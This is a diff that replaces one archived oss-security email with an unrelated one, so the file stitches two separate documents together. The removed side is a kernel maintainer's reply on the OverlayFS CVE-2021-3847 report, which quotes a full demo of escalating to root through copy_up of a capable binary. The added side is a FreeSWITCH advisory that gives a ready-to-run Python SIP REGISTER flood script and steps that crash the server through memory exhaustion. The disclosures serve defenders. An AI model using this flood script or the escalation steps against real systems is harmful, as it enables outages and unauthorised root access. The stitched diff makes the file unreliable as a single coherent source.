@@ -1,136 +1,132 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/10/19/2
-Message-ID: <YW7i72bOgRGmCs2O@miu.piliscsaba.redhat.com>
-Date: Tue, 19 Oct 2021 17:23:27 +0200
-From: Miklos Szeredi <miklos@...redi.hu>
-To: oss-security@...ts.openwall.com
-Cc: linux-fsdevel@...r.kernel.org, linux-unionfs@...r.kernel.org, Alon Zahavi <Alon.Zahavi@...erark.com>, Vegard Nossum <vegard.nossum@...cle.com>, Thadeu Lima de Souza Cascardo <cascardo@...onical.com>, Nir Chako <Nir.Chako@...erark.com>, Alon Zahavi <zahavi.alon@...il.com>
-Subject: Re: CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/10/25/4
+Message-Id: <a068d838-f3f9-4793-b336-e56b5cba501d@www.fastmail.com>
+Date: Mon, 25 Oct 2021 16:24:13 +0200
+From: "Sandro Gauci" <sandro@...blesecurity.com>
+To: oss-security@...ts.openwall.com, bugtraq@...urityfocus.com, fulldisclosure@...lists.org, voipsec@...psa.org, submissions@...ketstormsecurity.org, vuln@...unia.com, cert@...t.org
+Subject: [ES2021-06] FreeSWITCH susceptible to Denial of Service via SIP flooding
 Content-Type: text/plain; charset=utf-8
 
-On Thu, Oct 14, 2021 at 06:30:53PM +0000, Alon Zahavi wrote:
-> 
-> After disclosing the issue with the linux-distros mailing list, I am reporting the security issue publicly to here.
-> There is no patch available and may not be available for a long time because the kernel can’t enforce the mitigation proposed, as that would be a layering violation and could also possibly cause a regression.
-> This vulnerability was attached with CVE-2021-3847.
-> Here is the report that was initially sent:
-> 
-> ## Bug Class
-> Escalation of privileges - Bypassing the security extended attribute attachment restrictions (in order to modify the security.capability xattr, a process will need CAP_SYS_ADMIN or CAP_SETFCAP).
-> # Technical Details
-> ## Summary:
-> An attacker with a low-privileged user on a Linux machine with an overlay mount which has a file capability in one of its layers may escalate his privileges up to root when copying a capable file from a nosuid mount into another mount.
-> ## In details:
-> If there is an overlay mount that one of its lower layers contains a file with capabilities and in case that the lower layer is a nosuid mount (which means the file capabilities are being ignored at execution), an attacker with low-privileges user can touch the file, which causes the overlayFS driver to copy_up the file with its capabilities into the upper layer. That way the attacker can now execute the file with the file's capabilities, thus escalating its privileges.
+# FreeSWITCH susceptible to Denial of Service via SIP flooding
 
-I think this is a misunderstanding about how overlayfs operates.  Mounting
-overlayfs is effectively a just-in-time version of "cp -a lowerdir upperdir".
-In other words if the admin creates an overlay where the lower layer is
-untrusted and the upper layer is trusted, then that act itself is the
-privilege escalation.
+- Fixed versions: v1.10.7
+- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-06-freeswitch-flood-dos
+- Vendor Security Advisory: https://github.com/signalwire/freeswitch/security/advisories/GHSA-jvpq-23v4-gp3m
+- Other references: CVE-2021-41145
+- Tested vulnerable versions: <= v1.10.6
+- Timeline:
+    - Report date: 2021-05-28
+    - Triaged: 2021-06-18
+    - Fix provided for testing: 2021-10-08
+    - Second fix provided for testing: 2021-10-13
+    - Vendor release with fix: 2021-10-24
+    - Enable Security advisory: 2021-10-25
 
-This is more formally documented in "Documentation/filesystems/overlayfs.rst"
-in the "Permission model" section.
+## Description
 
-If this model is not clear, then maybe it needs to be spelled out more
-explicitly.  Perhaps even a warning message could be added to the kernel logs
-in case the lower mount is "nosuid".  But IMO erroring out on the copy-up or
-skipping copy up of certain attributes would make the cure worse than the
-disease.
+When flooding FreeSWITCH with SIP messages, it was observed that after a number of seconds the process was killed by the operating system due to memory exhaustion. The following excerpt from syslog shows one such instance:
 
-Let me know if I'm missing something.
+```
+May 25 15:19:30 ubuntu-bionic kernel: [ 4205.446584] Out of memory: Kill process 22590 (freeswitch) score 939 or sacrifice child
+May 25 15:19:30 ubuntu-bionic kernel: [ 4205.449845] Killed process 22590 (freeswitch) total-vm:10484768kB, anon-rss:7894136kB, file-rss:0kB, shmem-rss:0kB
+May 25 15:19:30 ubuntu-bionic kernel: [ 4205.720680] oom_reaper: reaped process 22590 (freeswitch), now anon-rss:0kB, file-rss:0kB, shmem-rss:0kB
+```
 
-Thanks,
-Miklos
+The tests were carried out using the SIP messages REGISTER, SUBSCRIBE, NOTIFY, PUBLISH, MESSAGE, INVITE and OPTIONS. On a machine with 8 gigabytes of RAM, the FreeSWITCH process crashed after 90 seconds of flooding with the SIP message REGISTER.
 
-> See attached image.
-> ## Build:
-> Any Linux machine with a support for overlayFS.
-> For example: AWS EC2 Ubuntu 20.04.
-> Mount a device to any folder.
-> Copy any file with capabilities into that folder.
-> Remount the device now with nosuid option.
-> mount an overlayFS mount where there are two layers. Make sure the lower directory is the directory with the capable file.
-> ## Execution:
-> As a low-priv user cd into the merged directory.
-> Execute touch capable_file
-> cd to the upper layer directory.
-> Execute the capable binary.
-> ## Expected Results:
-> When copying a capable file using a low privileges user, the file should be copied without any file capabilities. As the Linux kernel restricts the copying of a file with capabilities, so low-pric user should not be able to achieve this goal.
-> ## Observed Results:
-> The new file that appears in the upper layer directory have the same capabilities as the file that had been copied. This behavior occur probably because the overlay driver's process is the one responsible for the copying, and it copies the whole file with its extended attributes.
-> 
-> 
-> ########## Example ##########
-> # there are two mount in question
-> $ cd /home/user/overlayfs/
-> 
-> $ ls -l
-> drwxr-xr-x 3 user user   4096 Sep 19 14:07 lowerUSB
-> drwxrwxr-x 1 user user   4096 Sep 19 14:06 merge
-> drwxrwxr-x 2 user user   4096 Sep 14 13:32 test
-> drwxrwxr-x 2 user user   4096 Sep 19 14:06 upper
-> drwxrwxr-x 3 user user   4096 Sep 19 14:25 work
-> 
-> # there are two mount in question.
-> # lowerUSB is a mount of an USB, which has a capable file inside.
-> # IMPORTENT NOTE: This mount has "nosuid" option, so capabilities should be ignored while executing it.
-> # The second mount is the overlay mount. Its lower directory is `lowerUSB/` which is the first mount mentioned above. Its upper is just a regular directory on the root fs.
-> $ mount
-> /dev/sdd on /home/user/overlayfs/lowerUSB type ext4 (rw,nosuid,nodev,relatime,uhelper=udisks2)
-> overlay on /home/user/overlayfs/merge type overlay (rw,relatime,lowerdir=lowerUSB,upperdir=upper,workdir=work)
-> 
-> # The contents of all the directories.
-> $ ls -l *
-> lowerUSB:
-> total 40
-> -rwxr-xr-x 1 user user 17104 Sep 13 15:58 escalate
-> drwx------ 2 user user 16384 Jul  5 14:07 lost+found
-> 
-> merge:
-> total 40
-> -rwxr-xr-x 1 user user 17104 Sep 19 14:27 escalate
-> drwx------ 2 user user 16384 Jul  5 14:07 lost+found
-> 
-> test:
-> total 0
-> 
-> upper:
-> total 0
-> 
-> work:
-> total 4
-> d--------- 2 root root 4096 Sep 19 14:25 work
-> 
-> # escalate is an executable that set its uid and gid to 0.
-> $ getcap ./lowerUSB/escalate
-> ./lowerUSB/escalate = cap_setgid,cap_setuid+eip
-> 
-> $ id
-> uid=1000(user) gid=1000(user) groups=1000(user)
-> 
-> # When trying to execute ./lowerUSB/escalate, it does not work because it is a `nosuid` mount.
-> $ ./lowerUSB/escalate
-> [-] Failure
-> 
-> # Try to copy the binary with its capabilities.
-> # It should not work, because regular users are not allowed to copy the "security.capability" xattr.
-> $ cp --preserve=all ./lowerUSB/escalate ./test/escalate
-> cp: setting attribute 'security.capability' for 'security.capability': Operation not permitted
-> 
-> # Trigger the copy_up
-> $ touch ./merge/escalate
-> $ ls -l ./upper/
-> -rwxr-xr-x 1 user user 17K Sep 19 15:01 escalate
-> 
-> # The copy_up kept the binary capabilities (xattr)
-> $ getcap ./upper/escalate
-> ./upper/escalate = cap_setgid,cap_setuid+eip
-> 
-> # executing the binary, with the capabilities, so the privileges will escalate to root.
-> $ ./upper/escalate
-> $ id
-> uid=0(root) gid=0(root) groups=0(root)
-> 
-> 
+![Memory consumption over time during SIP flood attack against FreeSWITCH](memory-usage.png)
+
+When FreeSWITCH was run using [Valgrind](https://valgrind.org/), it was reported that large chunks of memory were being allocated in functions from the Sofia-SIP library source file `su_alloc.c`. Valgrind was executed with the flag `--leak-check=full` in order to get a detailed report of potential memory leaks. The target was flooded for a few seconds and then FreeSWITCH was gracefully terminated. The following is an excerpt from the report which identified large numbers of memory allocations in the function `su_home_new` in `su_alloc.c`:
+
+```
+2021-05-25 15:23:48.870010 [CONSOLE] switch_core_memory.c:671 Stopping memory pool queue.
+==401426== 
+==401426== HEAP SUMMARY:
+==401426==     in use at exit: 26,039,233 bytes in 87,160 blocks
+==401426==   total heap usage: 7,195,625 allocs, 7,108,465 frees, 986,221,122 bytes allocated
+==401426== 
+...
+==401426== 25,718,877 (368 direct, 25,718,509 indirect) bytes in 1 blocks are 
+            definitely lost in loss record 367 of 367
+==401426==    at 0x483DD99: calloc (in /.../vgpreload_memcheck-amd64-linux.so)
+==401426==    by 0x5422B57: su_home_new (su_alloc.c:569)
+==401426==    by 0x53AFB16: nua_create (nua.c:146)
+==401426==    by 0xA44D4B1: ???
+==401426==    by 0x4C054EF: dummy_worker (thread.c:151)
+==401426==    by 0x4D19608: start_thread (pthread_create.c:477)
+==401426==    by 0x4E55292: clone (clone.S:95)
+==401426== 
+==401426== LEAK SUMMARY:
+==401426==    definitely lost: 3,688 bytes in 35 blocks
+==401426==    indirectly lost: 25,728,877 bytes in 86,737 blocks
+==401426==      possibly lost: 133,576 bytes in 40 blocks
+==401426==    still reachable: 173,092 bytes in 348 blocks
+```
+
+
+## Impact
+
+By abusing this vulnerability, an attacker is able to crash any FreeSWITCH instance by flooding it with SIP messages, leading to Denial of Service. The attack does not require authentication and can be carried out over UDP, TCP or TLS.
+
+## How to reproduce the issue
+
+1. Build FreeSWITCH from source and install it
+2. Run FreeSWITCH with the default configuration
+3. Save the following Python script as `freeswitch-sipflood.py`
+
+    ```python
+    import socket, string, random, sys
+    
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    cseq = 1
+    UDP_IP = sys.argv[1]
+    UDP_PORT = 5060
+    
+    while True:
+        r = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
+    
+        msg = "REGISTER sip:%s SIP/2.0\r\n" % (UDP_IP, )
+        msg += "Via: SIP/2.0/UDP 127.0.0.1:46786;rport;branch=z9hG4bK-%s\r\n" % (r, )
+        msg += "Max-Forwards: 70\r\n"
+        msg += "From: <sip:98647499@%s>;tag=%s\r\n" % (UDP_IP, r, )
+        msg += "To: <sip:98647499@%s>\r\n" % (UDP_IP, )
+        msg += "Call-ID: %s\r\n" % (r, )
+        msg += "CSeq: %s REGISTER\r\n" % (cseq, )
+        msg += "Contact: <sip:98647499@%s:46786;transport=udp>\r\n" % (UDP_IP, )
+        msg += "Expires: 60\r\n"
+        msg += "Content-Length: 0\r\n"
+        msg += "\r\n" 
+    
+        sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))
+    
+        cseq += 1
+    ```
+4. Run the Python script and specify the target IP as the first command line parameter:
+
+    ```bash
+    python freeswitch-sipflood.py <target_ip>
+    ```
+5. Notice that the memory consumption of FreeSWITCH increases rapidly over time, until FreeSWITCH is killed by the underlying operating system
+
+Note that in some cases where the test machine under attack has more memory resources, the attack done over UDP may not succeed in consuming all system memory. During our testing with SIPVicious PRO, however, we could always get the process to consume all the system's memory when the attack is done cover TCP.
+
+## Solution and recommendations
+
+Upgrade to a version of FreeSWITCH that fixes this issue.
+
+Our suggestion to the FreeSWITCH developers was the following:
+
+> Our recommendation for FreeSWITCH developers is to review the code handling memory allocation and apply changes to address this issue. At Enable Security we're happy to test potential fixes for this issue.
+
+## About Enable Security
+
+[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.
+
+## Disclaimer
+
+The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
+
+## Disclosure policy
+
+This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.
+
